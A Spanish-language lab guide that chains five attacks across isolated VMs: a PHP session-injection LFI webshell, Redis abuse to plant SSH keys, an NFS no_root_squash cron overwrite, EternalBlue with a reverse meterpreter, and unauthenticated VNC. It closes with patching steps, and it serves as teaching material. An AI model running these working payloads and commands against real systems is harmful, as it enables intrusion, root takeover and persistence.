# Guía de explotación · Lab PHP2Shell

> Cadena: **M6 → M1 (PHP2Shell) → M2 (Redis) → M3 (NFS) → M4 (MS17-010) → M5 (VNC)**.
> Cada salto es una vulnerabilidad. Ninguno usa contraseñas.
> Solo red aislada `10.10.10.0/24`, VM propias y autorización del docente.

---

## 0. Antes de empezar

| Necesitas | Detalle |
|---|---|
| M6 arriba | Kali `10.10.10.20`, sirve repo y artefactos en `:8000` |
| Snapshots | `00-base` de cada VM antes de tocar nada |
| Artefactos | `artifacts/` con SHA256 (los instala M6) |
| Tiempo | ~30 min de instalación (M1 compila Apache y PHP) |

Convención de evidencias: `EV-<salto>-NN.png` + `LOG-<salto>-NN.txt` + SHA256, hora UTC.

### 0.1 Trazabilidad: de dónde sale cada comando

Todos los comandos de esta guía están implementados en el repo. Si algo cambia,
se cambia en el script y la guía debe seguirlo.

| Comando de la guía | Dónde está implementado |
|---|---|
| `bootstrap.sh` / `bootstrap.ps1` | `lab/bootstrap.sh`, `lab/bootstrap.ps1` |
| `lab/session.php` y `dl.php` | `lab/m1/app/lab/session.php`, `lab/m1/app/legacy-download/` |
| `session.save_path=/tmp`, `cleanup=Off` | `lab/m1/conf/php-lab.ini` |
| 6 niveles `../../../../../../tmp/sess_` | `dl.php` incluye desde `legacy-download/templates/` |
| `redis-cli ... CONFIG SET` | `lab/m2/install.sh` (Redis `User=root`, sin `requirepass`) |
| `mount -t nfs` + `rotate.sh` | `lab/m3/install.sh` (`no_root_squash`, `/etc/cron.d/lab-rotate`) |
| `ms17_010_eternalblue` | `lab/m4/install.ps1` (`Enable-LabSmb1`) + `lab/chain/04` |
| `vnc-info` / `vncviewer` | `lab/m5/install.ps1` (`UseVncAuthentication=0`, 5900) |
| Ejecución por pasos | `lab/chain/01-m1-php2shell.sh` … `05-m4-to-m5.sh` |

---

## 1. Instalación (una vez)

### 1.1 M6: servidor de despliegue

```bash
cd /ruta/al/repo
sudo bash lab/m6/install.sh
# deja /srv/lab, /srv/lab.tar.gz y sirve en :8000
```

Si no queda sirviendo: `bash lab/m6/serve.sh`.

### 1.2 Orden de instalación

```
M6 → M3 → M2 → M1 → M4 → M5
```

M3 antes que M2 para que M2 pueda copiar su llave de administración; M1 al final
porque necesita M2 (base de datos) y M3 (NFS).

En cada VM Ubuntu, desde su consola:

```bash
curl -fsSL http://10.10.10.20:8000/bootstrap.sh | sudo bash -s m3   # o m2, m1
```

En cada Windows (consola elevada):

```powershell
iwr http://10.10.10.20:8000/bootstrap.ps1 -UseBasicParsing | iex
# luego: C:\lab\m4\install.ps1   (o m5)
```

### 1.3 Verificación

```bash
# en M6
bash lab/chain/00-preflight.sh --full   # FAIL=0 antes de la demo
bash lab/tests/smoke.sh

# en cada VM, tras instalar
bash /opt/lab/lab/m1/verify.sh
# si el paquete se extrajo con la raíz en lab/, la ruta es /opt/lab/m1/verify.sh
```

`smoke.sh` debe dar PASS en 443 (M1), 3306/6379 (M2), 21/2049 (M3),
53/445/5985 (M4), 445/3389/5900 (M5) y resolver `wp.uni.lab` por el DNS de M4.

---

## 2. Salto 1 · M6 → M1 · PHP2Shell

**Objetivo:** `www-data` en M1.
**Vulnerabilidad:** `session.upload_progress` + sink LFI del plugin `legacy-download`.

> **Importante:** PHP2Shell da **`www-data`, no `root`**. Y no hace falta root en M1:
> el salto 2 ataca Redis en M2 por red. Si en la réplica alguien espera `uid=0`
> aquí, la respuesta es: "el primer salto da el usuario del servicio web; root
> llega en M2".

### 2.1 Comprobación previa

```bash
curl -k -s -o /dev/null -w '%{http_code}\n' https://wp.uni.lab/
curl -k -s -o /dev/null -w '%{http_code}\n' https://wp.uni.lab/lab/session.php
curl -k -s 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php?file=default.php'
```

Los tres deben responder `200`.

### 2.2 Explotación manual

```bash
SID="lab$(date +%s)"
head -c 8388608 /dev/zero > /tmp/u.bin

# 1) sembrar la sesión: el nombre del campo va al archivo de sesión
curl -sk --limit-rate 128k -b "PHPSESSID=$SID" \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "PWN"; system($_GET["c"]); ?>' \
  -F 'payload=@/tmp/u.bin;filename=payload.bin' \
  https://wp.uni.lab/lab/session.php &

sleep 3

# 2) incluir el archivo de sesión por el LFI (6 niveles hasta /)
curl -sk -G 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php' \
  --data-urlencode "file=../../../../../../tmp/sess_$SID" \
  --data-urlencode 'c=id'
```

Esperado:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Si responde, guarda el SID y sigue con ese canal para comandos:

```bash
curl -sk -G 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php' \
  --data-urlencode "file=../../../../../../tmp/sess_$SID" \
  --data-urlencode 'c=cat /var/www/wp/wp-config.php'
```

### 2.3 Automático

```bash
bash lab/chain/01-m1-php2shell.sh --run
```

### 2.4 `entry-a` (opcional, time-box)

El CVE puro. Se intenta y se documenta; **no se declara RCE sin `id`**:

```bash
bash lab/chain/01-m1-php2shell.sh --run --entry a --timebox 600
```

---

## 3. Salto 2 · M1 → M2 · Redis sin autenticación

**Objetivo:** `root` en M2.
**Vulnerabilidad:** Redis 6.2.6 en `0.0.0.0:6379` sin `requirepass` y corriendo
como root. `CONFIG SET dir/dbfilename` + `SAVE` escribe un archivo arbitrario.

### 3.1 Comprobación

```bash
redis-cli -h 10.10.10.12 PING
# PONG
redis-cli -h 10.10.10.12 CONFIG GET dir
```

### 3.2 Explotación manual

```bash
mkdir -p ~/lab-work && chmod 700 ~/lab-work
ssh-keygen -t ed25519 -N '' -f ~/lab-work/id_lab

redis-cli -h 10.10.10.12 CONFIG SET dir /root/.ssh
redis-cli -h 10.10.10.12 CONFIG SET dbfilename authorized_keys
printf '\n\n%s\n\n' "$(cat ~/lab-work/id_lab.pub)" | \
  redis-cli -h 10.10.10.12 -x SET lab_pwn
redis-cli -h 10.10.10.12 SAVE

ssh -i ~/lab-work/id_lab root@10.10.10.12 'id; hostname'
```

Esperado: `uid=0(root) gid=0(root)`.

### 3.3 Automático

```bash
bash lab/chain/02-m1-to-m2.sh --run
```

### 3.4 Si falla

- `CONFIG SET` responde error → Redis no es root o `protected-mode` está en `yes`.
- `PONG` pero la llave no entra → `/root/.ssh` no existe o sshd no acepta llaves
  de root. Comprueba en M2: `ls -ld /root/.ssh`, `sshd -T | grep permitrootlogin`.

---

## 4. Salto 3 · M2 → M3 · NFS `no_root_squash` + cron root

**Objetivo:** `root` en M3.
**Vulnerabilidad:** `/srv/storage/backups` se exporta con `no_root_squash` y el
root de M3 ejecuta cada minuto `rotate.sh` desde ese directorio. El root del
cliente NFS (M2) sobrescribe el script.

### 4.1 Comprobación (desde M2 como root)

```bash
ssh -i ~/lab-work/id_lab root@10.10.10.12
mkdir -p /mnt/bkp
mount -t nfs 10.10.10.13:/srv/storage/backups /mnt/bkp
findmnt -no SOURCE,OPTIONS /mnt/bkp
ls -l /mnt/bkp/rotate.sh
```

Debe verse `no_root_squash` en las opciones del export.

### 4.2 Explotación manual (en M2)

```bash
cat > /mnt/bkp/rotate.sh <<'EOF'
#!/bin/sh
mkdir -p /root/.ssh
grep -qF 'ssh-ed25519 AAAA...TU_CLAVE...' /root/.ssh/authorized_keys 2>/dev/null || \
  echo 'ssh-ed25519 AAAA...TU_CLAVE...' >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys
id > /root/PWNED-M3.txt
EOF
chmod 755 /mnt/bkp/rotate.sh
```

Espera al cron (≤ 60 s) y entra:

```bash
ssh -i ~/lab-work/id_lab root@10.10.10.13 'id; cat /root/PWNED-M3.txt'
```

### 4.3 Automático

```bash
bash lab/chain/03-m2-to-m3.sh --run
```

### 4.4 Si falla

- `mount` cuelga o da `access denied` → UFW de M3 no permite 2049 desde M2.
- El cron no corre → `systemctl status cron`, `cat /etc/cron.d/lab-rotate`.
- El archivo no cambia → el export no tiene `no_root_squash` (`exportfs -v`).

---

## 5. Salto 4 · M3 → M4 · MS17-010 (EternalBlue)

**Objetivo:** `SYSTEM` en M4.
**Vulnerabilidad:** SMBv1 habilitado en Windows Server 2016 sin MS17-010.

### 5.1 Comprobación

```bash
nmap -Pn -p445 --script smb-vuln-ms17-010 10.10.10.14
```

Debe decir `VULNERABLE` (o al menos `State: LIKELY VULNERABLE`).

### 5.2 Explotación manual (Metasploit)

```bash
msfconsole -q
```

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.14
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.20
set LPORT 4444
exploit
```

En el meterpreter:

```text
getuid
# NT AUTHORITY\SYSTEM
```

### 5.3 Automático (marcador sin credenciales)

```bash
bash lab/chain/04-m3-to-m4.sh --run
```

El script lanza un payload `windows/x64/exec` que escribe
`C:\Transfer\PWNED-M4.txt` y lo lee por SMB anónimo (`Transfer` es Everyone).
Esperado: `nt authority\system`.

### 5.4 Fallback: PrintNightmare

Si el build ya trae MS17-010:

- Cuenta limitada ya creada: `soporte` / `Soporte2026!`
- Spooler activo (lo deja el instalador de M4).
- Exploit: `CVE-2021-34527` (cube0x0/CVE-2021-1675, SharpPrintNightmare o el
  módulo de Metasploit `exploit/windows/local/cve_2021_34527_printnightmare`).
- Resultado esperado: `NT AUTHORITY\SYSTEM` desde una sesión de `soporte`.

---

## 6. Salto 5 · M4 → M5 · VNC sin autenticación

**Objetivo:** escritorio de M5 y su bandera.
**Vulnerabilidad:** TightVNC 2.8.90 con `UseVncAuthentication=0` (CWE-306).

### 6.1 Comprobación

```bash
nmap -Pn -p5900 --script vnc-info 10.10.10.15
```

Esperado: `Authentication: None`.

### 6.2 Acceso

```bash
vncviewer 10.10.10.15
```

Sin contraseña. En el escritorio está `flag-M5.txt`.

### 6.3 Captura no interactiva

```bash
pip install vncdotool
vncdotool -s 10.10.10.15 capture /tmp/m5-flag.png
```

### 6.4 Automático

```bash
bash lab/chain/05-m4-to-m5.sh --run
```

---

## 7. Demo completa (orden de la sustentación)

```bash
# 0. comprobar que todo está en su sitio (FAIL=0)
bash lab/chain/00-preflight.sh --full

# 1. entrada
bash lab/chain/01-m1-php2shell.sh --run        # uid=33(www-data)

# 2. Redis -> root M2
bash lab/chain/02-m1-to-m2.sh --run            # uid=0(root)

# 3. NFS + cron -> root M3
bash lab/chain/03-m2-to-m3.sh --run            # uid=0(root) + PWNED-M3.txt

# 4. MS17-010 -> SYSTEM M4
bash lab/chain/04-m3-to-m4.sh --run            # nt authority\system

# 5. VNC -> M5
bash lab/chain/05-m4-to-m5.sh --run            # captura con la bandera
```

Guarda por salto: comando, salida, captura y `sha256sum`.

---

## 8. Evidencias mínimas por salto

| Salto | Evidencia | Qué debe verse |
|---|---|---|
| 1 | `EV-01` + `LOG-01` | `uid=33(www-data)` y la URL del sink |
| 2 | `EV-02` | `PONG`, `CONFIG SET`, `uid=0(root)` en M2 |
| 3 | `EV-03` | `no_root_squash`, `rotate.sh`, `uid=0(root)` en M3 |
| 4 | `EV-04` | `smb-vuln-ms17-010` y `nt authority\system` |
| 5 | `EV-05` | `Authentication: None` y captura del escritorio |

---

## 9. Problemas típicos

| Síntoma | Causa probable | Solución |
|---|---|---|
| 443 no responde | Apache/nginx caídos | `systemctl status apache-lab nginx`; `bash m1/verify.sh` |
| `dl.php` da 404 | plugin no activo | activar `legacy-download` en wp-admin |
| LFI no ejecuta | `session.upload_progress.cleanup=On` | debe estar `Off`; revisar `php -i` |
| No aparece `/tmp/sess_*` | `save_path` distinto | `php -i | grep save_path` (debe ser `/tmp`) |
| Redis `PONG` pero sin llave | Redis no root o `/root/.ssh` ausente | `ps -o user= -C redis-server`; crear `/root/.ssh` |
| `mount` NFS falla | 2049 cerrado desde M2 | `ufw allow from 10.10.10.12 to any port 2049` en M3 |
| EternalBlue falla | build parcheado | usar PrintNightmare con `soporte` |
| VNC no responde | `tvnserver` caído o 5900 filtrado | `Get-Service tvnserver`; regla de firewall |

---

## 10. Límites que debes declarar

1. **`entry-b` no es el UAF** de CVE-2026-109618: es session injection + LFI.
   El UAF puro (`entry-a`) sigue sin PoC público fiable.
2. **Redis como root** es una misconfiguración intencional, no un CVE.
   Si se exige CVE, la alternativa es CVE-2022-0543 (paquete Debian de Redis).
3. **MS17-010 depende del build** de WS2016; el fallback es PrintNightmare.
4. **La LAN es plana:** los scripts corren desde M6 y el pivote es lógico, no un túnel.
5. **VNC sin auth** da escritorio, no shell; la evidencia es la captura, no un `id`.

---

## 11. Volver al estado parcheado

Restaurar `estado-inicial` y aplicar:

| VM | Parche |
|---|---|
| M1 | PHP 8.4.27 + `session.upload_progress.enabled=Off` + borrar el plugin legado |
| M2 | `requirepass`, `bind 127.0.0.1`, Redis sin root |
| M3 | `root_squash`, quitar el cron sobre el export |
| M4 | MS17-010 + SMB1 off + Spooler detenido |
| M5 | VNC con contraseña + RDP con NLA |

Después, repetir los mismos comandos: deben fallar.
